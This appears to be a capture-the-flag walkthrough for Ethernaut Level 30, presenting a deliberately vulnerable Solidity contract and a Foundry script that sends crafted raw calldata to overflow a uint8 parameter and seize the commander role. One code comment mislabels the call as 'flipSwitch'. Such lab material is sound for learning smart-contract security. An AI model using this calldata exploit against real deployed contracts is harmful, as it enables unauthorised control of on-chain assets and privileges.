# Level 30 - Higher Order ⏺⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/30" %}

### Level Setup

{% hint style="info" %}
Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power. Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme.

Your objective is to become the Commander of the Higher Order! Good luck!

**Things that might help:**

* Sometimes, `calldata` cannot be trusted.
* Compilers are constantly evolving into better spaceships.
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/HigherOrder.sol" %}

{% code lineNumbers="true" fullWidth="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```
{% endcode %}

### Exploit

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-30

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-30

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/cd8d7f358bd104207c9c94f35fa3a58eb96042ac/script/Level30.s.sol" %}

{% code title="script/Level30.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                     LEVEL 30 - HIGHER ORDER                  │
// ================================================================

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        bytes4 registerTreasurySelector = bytes4(keccak256("registerTreasury(uint8)"));

        bytes memory callData = abi.encodePacked(
            registerTreasurySelector, // 4 bytes - registerTreasury function selector
            uint256(0x1F4) // 32 bytes - the value 500
        );

        // Call flipSwitch with this manipulated data
        (bool success,) = targetContractAddress.call(callData);
        require(success, "Call failed");

        (bool claimLeadershipSuccess,) =
            targetContractAddress.call(abi.encodePacked(bytes4(keccak256("claimLeadership()"))));
        require(claimLeadershipSuccess, "Claim leadership failed");

        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

Submit instance... 🥳

### Completion Message

{% hint style="info" %}
You've conquered the Higher Order challenge, mastering the Dirty Higher Order Bits exploit to claim the title of Commander. In this quest, you've delved deep into Solidity, learning to manipulate bytes and bypass function type checks.

Your victory not only showcases your technical prowess but also highlights your ability to think creatively and critically.
{% endhint %}
